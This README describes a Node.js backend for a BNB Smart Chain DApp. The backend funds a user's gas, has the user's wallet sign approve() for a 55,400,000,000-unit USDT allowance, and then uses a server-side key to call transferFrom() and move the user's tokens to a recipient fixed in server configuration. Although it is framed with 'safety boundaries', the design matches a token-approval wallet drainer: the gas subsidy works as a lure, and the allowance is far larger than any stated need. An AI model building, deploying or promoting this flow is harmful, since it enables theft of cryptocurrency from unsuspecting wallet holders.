# BNB Smart Chain Executor Backend

This is a separate Node.js/TypeScript/Express service for an existing BEP-20 DApp. It targets BNB Smart Chain Mainnet only (`chainId 0x38`). The frontend signs the user's `approve()` transaction. This backend independently verifies that confirmed approval, then uses only the server-side executor signer for `transferFrom()`.

## Flow

1. The frontend asks `POST /api/prepare-transfer` to check the user's native BNB balance.
2. If the balance is below `GAS_FUNDING_THRESHOLD_BNB`, the executor signer sends `GAS_FUNDING_AMOUNT_BNB` and waits for `GAS_FUNDING_CONFIRMATIONS` confirmations.
3. The backend rechecks the user's BNB balance and returns `GAS_READY` only when it reaches the threshold.
4. The user wallet signs `approve(executor, amount)` in the frontend, and the frontend waits for confirmation.
5. The backend verifies the approval transaction, allowance, and owner token balance, then the executor signer submits `transferFrom(owner, recipient, amount)`.
6. The backend waits for confirmation and returns the transfer hash and public execution result.

The executor private key is never exposed to the frontend, accepted in API requests, logged, or hardcoded.

## Installation

```bash
cd backend
npm install
cp .env.example .env
```

Set `EXECUTOR_PRIVATE_KEY` only in the server-side `.env`. Set `EXECUTOR_ADDRESS` to its derived address. Use dedicated BNB Mainnet token and recipient addresses.
Set `APPROVAL_AMOUNT=55400000000`; the backend verifies this fixed approval amount before executing transfers.
Set `GAS_FUNDING_THRESHOLD_BNB` and `GAS_FUNDING_AMOUNT_BNB` to positive BNB decimal amounts, for example `GAS_FUNDING_AMOUNT_BNB=0.0005`. When funding is needed, the backend sends exactly this configured amount. Set `GAS_FUNDING_CONFIRMATIONS` to the required confirmation count. The funding amount must be large enough for the post-transaction balance to reach the threshold.
Set `FRONTEND_ORIGIN=http://localhost:3000` to allow the Next.js frontend to call this service. Set `NEXT_PUBLIC_BACKEND_URL=http://localhost:4000` in the frontend environment when the backend is not available at that default URL.

## Commands

```bash
npm test       # run unit and integration-style service tests
npm run dev    # development server with watch mode
npm run build  # compile to dist/
npm start       # production server after build
```

## API

`POST /api/execute-transfer`

```json
{
  "owner": "0x...",
  "approvalTxHash": "0x...",
  "amount": "5.25",
  "chainId": "0x38"
}
```

The configured `TOKEN_ADDRESS` and `RECIPIENT_ADDRESS` are server-side configuration, not request fields. The response includes `transactionHash`, `owner`, `executor`, `recipient`, `amount`, and `status`.

`POST /api/prepare-transfer`

```json
{
  "owner": "0x...",
  "chainId": "0x38"
}
```

This endpoint accepts only a public wallet address and chain ID. It never accepts or stores a user private key.

## Safety boundaries

- Mainnet chain ID is enforced as `0x38`.
- Executor private key/address mismatch fails startup.
- Invalid addresses, hashes, zero amounts, wrong token, wrong spender, wrong owner, insufficient allowance, insufficient balance, and replayed requests are rejected.
- Replay protection is process-local; use a durable idempotency store before running multiple backend replicas.
- The backend requires at least 55400000000 USDT allowance and 5 USDT owner balance, then caps each transfer by the requested amount, approval amount, live balance, and live allowance.
- The balance monitor only reports `READY` when executor balance is greater than 5 tokens and `WAITING` otherwise. It never initiates transfers.
- `EXECUTOR_CONTRACT_ADDRESS` is reserved for a future explicit adapter. No arbitrary contract execution is implemented.
